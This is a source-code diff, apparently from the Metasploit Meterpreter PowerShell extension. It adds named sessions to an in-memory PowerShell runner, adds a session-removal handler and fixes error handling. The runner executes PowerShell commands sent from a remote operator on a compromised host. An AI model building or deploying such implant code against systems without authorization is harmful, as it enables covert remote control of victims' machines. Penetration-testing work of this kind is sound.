@@ -17,6 +17,7 @@ typedef struct _InteractiveShell
 {
 	HANDLE wait_handle;
 	_bstr_t output;
+	wchar_t* session_id;
 } InteractiveShell;
 
 #define SAFE_RELEASE(x) if((x) != NULL) { (x)->Release(); x = NULL; }
@@ -26,6 +27,7 @@ typedef struct _InteractiveShell
     rename("ReportEvent", "InteropServices_ReportEvent")
 using namespace mscorlib;
 
+
 static ICLRMetaHost* gClrMetaHost = NULL;
 static ICLRRuntimeInfo* gClrRuntimeInfo = NULL;
 static ICorRuntimeHost* gClrCorRuntimeHost = NULL;
@@ -34,12 +36,12 @@ static _AppDomainPtr gClrAppDomainInterface = NULL;
 static _AssemblyPtr gClrPowershellAssembly = NULL;
 static _TypePtr gClrPowershellType = NULL;
 
-DWORD InvokePowershellMethod(_TypePtr spType, wchar_t* method, wchar_t* command, _bstr_t& output)
+DWORD RemoveSession(wchar_t* sessionId)
 {
 	HRESULT hr;
-	bstr_t bstrStaticMethodName(method);
+	bstr_t bstrStaticMethodName(L"Remove");
 	SAFEARRAY *psaStaticMethodArgs = NULL;
-	variant_t vtStringArg(command);
+	variant_t vtSessionArg(sessionId == NULL ? L"Default" : sessionId);
 	variant_t vtPSInvokeReturnVal;
 	variant_t vtEmpty;
 	LONG index = 0;
@@ -47,15 +49,15 @@ DWORD InvokePowershellMethod(_TypePtr spType, wchar_t* method, wchar_t* command,
 	psaStaticMethodArgs = SafeArrayCreateVector(VT_VARIANT, 0, 1);
 	do
 	{
-		hr = SafeArrayPutElement(psaStaticMethodArgs, &index, &vtStringArg);
+		hr = SafeArrayPutElement(psaStaticMethodArgs, &index, &vtSessionArg);
 		if (FAILED(hr))
 		{
-			dprintf("[PSH] failed to prepare arguments: 0x%x", hr);
+			dprintf("[PSH] failed to prepare session argument: 0x%x", hr);
 			break;
 		}
 
 		// Invoke the method from the Type interface.
-		hr = spType->InvokeMember_3(
+		hr = gClrPowershellType->InvokeMember_3(
 			bstrStaticMethodName,
 			static_cast<BindingFlags>(BindingFlags_InvokeMethod | BindingFlags_Static | BindingFlags_Public),
 			NULL,
@@ -65,7 +67,65 @@ DWORD InvokePowershellMethod(_TypePtr spType, wchar_t* method, wchar_t* command,
 
 		if (FAILED(hr))
 		{
-			dprintf("[PSH] failed to invoke powershell function", hr);
+			dprintf("[PSH] failed to invoke powershell function 0x%x", hr);
+			break;
+		}
+	} while (0);
+
+	if (psaStaticMethodArgs != NULL)
+	{
+		SafeArrayDestroy(psaStaticMethodArgs);
+	}
+
+	if (SUCCEEDED(hr))
+	{
+		return ERROR_SUCCESS;
+	}
+
+	return (DWORD)hr;
+}
+
+DWORD InvokePSCommand(wchar_t* sessionId, wchar_t* command, _bstr_t& output)
+{
+	HRESULT hr;
+	bstr_t bstrStaticMethodName(L"Execute");
+	SAFEARRAY *psaStaticMethodArgs = NULL;
+	variant_t vtSessionArg(sessionId == NULL ? L"Default" : sessionId);
+	variant_t vtPSInvokeReturnVal;
+	variant_t vtEmpty;
+	variant_t vtCommandArg(command);
+	LONG index = 0;
+
+	psaStaticMethodArgs = SafeArrayCreateVector(VT_VARIANT, 0, 2);
+	do
+	{
+		hr = SafeArrayPutElement(psaStaticMethodArgs, &index, &vtSessionArg);
+		if (FAILED(hr))
+		{
+			dprintf("[PSH] failed to prepare session argument: 0x%x", hr);
+			break;
+		}
+
+		index++;
+		hr = SafeArrayPutElement(psaStaticMethodArgs, &index, &vtCommandArg);
+		if (FAILED(hr))
+		{
+			dprintf("[PSH] failed to prepare command argument: 0x%x", hr);
+			break;
+		}
+
+		// Invoke the method from the Type interface.
+		hr = gClrPowershellType->InvokeMember_3(
+			bstrStaticMethodName,
+			static_cast<BindingFlags>(BindingFlags_InvokeMethod | BindingFlags_Static | BindingFlags_Public),
+			NULL,
+			vtEmpty,
+			psaStaticMethodArgs,
+			&vtPSInvokeReturnVal);
+
+		if (FAILED(hr))
+		{
+			dprintf("[PSH] failed to invoke powershell function 0x%x", hr);
 			break;
 		}
 		output = vtPSInvokeReturnVal.bstrVal;
@@ -76,7 +136,7 @@ DWORD InvokePowershellMethod(_TypePtr spType, wchar_t* method, wchar_t* command,
 		SafeArrayDestroy(psaStaticMethodArgs);
 	}
 
-	if (SUCCEEDED(S_OK))
+	if (SUCCEEDED(hr))
 	{
 		return ERROR_SUCCESS;
 	}
@@ -183,7 +243,7 @@ DWORD initialize_dotnet_host()
 		}
 
 		dprintf("[PSH] Loading the type from memory");
-		_bstr_t pshClassName("PowerShellRunner.PowerShellRunner");
+		_bstr_t pshClassName("MSF.Powershell.Runner");
 		if (FAILED(hr = clrPowershellAssembly->GetType_2(pshClassName, &clrPowershellType)))
 		{
 			dprintf("[PSH] Unable to locate the powershell class type 0x%x", hr);
@@ -191,6 +251,7 @@ DWORD initialize_dotnet_host()
 		}
 
 		dprintf("[PSH] Runtime has been initialized successfully");
+
 	} while(0);
 
 	if (clrByteArray != NULL)
@@ -299,7 +360,7 @@ DWORD powershell_channel_write(Channel* channel, Packet* request, LPVOID context
 
 	_bstr_t output;
 
-	DWORD result = InvokePowershellMethod(gClrPowershellType, L"InvokePS", codeMarshall, output);
+	DWORD result = InvokePSCommand(shell->session_id, codeMarshall, output);
 	if (result == ERROR_SUCCESS)
 	{
 		shell->output += output + "PS > ";
@@ -312,11 +373,18 @@ DWORD powershell_channel_close(Channel* channel, Packet* request, LPVOID context
 {
 	dprintf("[PSH SHELL] closing channel");
 	InteractiveShell* shell = (InteractiveShell*)context;
-	if (shell->wait_handle != NULL)
+
+	if (shell != NULL)
 	{
-		CloseHandle(shell->wait_handle);
+		if (shell->wait_handle != NULL)
+		{
+			CloseHandle(shell->wait_handle);
+		}
+
+		SAFE_FREE(shell->session_id);
+		SAFE_FREE(shell);
 	}
-	free(shell);
+
 	return ERROR_SUCCESS;
 }
 
@@ -345,6 +413,7 @@ DWORD request_powershell_shell(Remote *remote, Packet *packet)
 				dwResult = ERROR_OUTOFMEMORY;
 				break;
 			}
+			shell->session_id = packet_get_tlv_value_wstring(packet, TLV_TYPE_POWERSHELL_SESSIONID);
 
 			chanOps.native.context = shell;
 			chanOps.native.close = powershell_channel_close;
@@ -378,6 +447,7 @@ DWORD request_powershell_execute(Remote *remote, Packet *packet)
 {
 	DWORD dwResult = ERROR_SUCCESS;
 	Packet* response = packet_create_response(packet);
+	wchar_t* sessionId = NULL;
 
 	if (response)
 	{
@@ -387,7 +457,9 @@ DWORD request_powershell_execute(Remote *remote, Packet *packet)
 			_bstr_t codeMarshall(code);
 			_bstr_t output;
 
-			dwResult = InvokePowershellMethod(gClrPowershellType, L"InvokePS", codeMarshall, output);
+			sessionId = packet_get_tlv_value_wstring(packet, TLV_TYPE_POWERSHELL_SESSIONID);
+
+			dwResult = InvokePSCommand(sessionId, codeMarshall, output);
 			if (dwResult == ERROR_SUCCESS)
 			{
 				packet_add_tlv_string(response, TLV_TYPE_POWERSHELL_RESULT, output);
@@ -400,6 +472,34 @@ DWORD request_powershell_execute(Remote *remote, Packet *packet)
 		}
 		packet_transmit_response(dwResult, remote, response);
 	}
+
+	SAFE_FREE(sessionId);
+
+	return dwResult;
+}
+
+/*!
+ * @brief Handle the removal of a session from the interpreter.
+ * @param remote Pointer to the \c Remote making the request.
+ * @param packet Pointer to the request \c Packet.
+ * @returns Indication of success or failure.
+ */
+DWORD request_powershell_session_remove(Remote *remote, Packet *packet)
+{
+	DWORD dwResult = ERROR_SUCCESS;
+	Packet* response = packet_create_response(packet);
+	wchar_t* sessionId = NULL;
+
+	if (response)
+	{
+		sessionId = packet_get_tlv_value_wstring(packet, TLV_TYPE_POWERSHELL_SESSIONID);
+
+		dwResult = RemoveSession(sessionId);
+
+		packet_transmit_response(dwResult, remote, response);
+	}
+
+	SAFE_FREE(sessionId);
 
 	return dwResult;
 }
